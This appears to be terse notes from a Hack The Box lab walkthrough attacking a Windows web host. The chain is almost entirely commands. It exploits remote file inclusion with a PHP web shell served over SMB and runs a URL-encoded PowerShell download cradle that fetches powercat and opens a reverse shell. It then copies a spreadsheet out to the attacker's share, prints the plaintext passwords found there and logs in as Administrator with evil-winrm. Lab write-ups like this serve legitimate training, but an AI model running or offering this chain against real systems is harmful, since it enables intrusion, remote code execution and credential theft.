Change the language 

```
http://10.10.110.213/lang.php?page=gr.php
```

This is vulnerable to RFI

```
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```
Start SMB Server
```
impacket-smbserver -smb2support myshare /home/p3ta/HTB/genesis/213
```
Test with whoami
```
http://10.10.110.213/lang.php?page=//10.10.14.21/myshare/shell.php&cmd=whoami
```
HTTP Server
```
python -m SimpleHTTPServer 80
```
Grab Powercat
```
git clone https://github.com/besimorhino/powercat.git
```
Browser
```
http://10.10.110.213/lang.php?page=//10.10.14.21/myshare/shell.php&cmd=powershell%20-c%20%22IEX(New-Object%20System.Net.WebClient).DownloadString(%27http://10.10.14.21/powercat.ps1%27);powercat%20-c%2010.10.14.21%20-p%209001%20-e%20cmd%22
```
Look in documents
```
 Directory of C:\Users\alida\Documents

12/17/2020  05:23 PM    <DIR>          .
12/17/2020  05:23 PM    <DIR>          ..
04/09/2021  06:07 AM             8,216 accounts.xlsx
               1 File(s)          8,216 bytes
               2 Dir(s)   8,856,829,952 bytes free
```
Copy to SMB
```
copy accounts.xlsx \\10.10.14.21\myshare
```
Credentials
```
		
Username	Password	
		
ray	IJA8s8c77s	
Administrator	xK3wdk532r	
Ela	sowi3$$#ee	
Sage	lasp:2123#	
```
Evilwin-RM
```
evil-winrm -u administrator -p xK3wdk532r -i 10.10.110.213
```




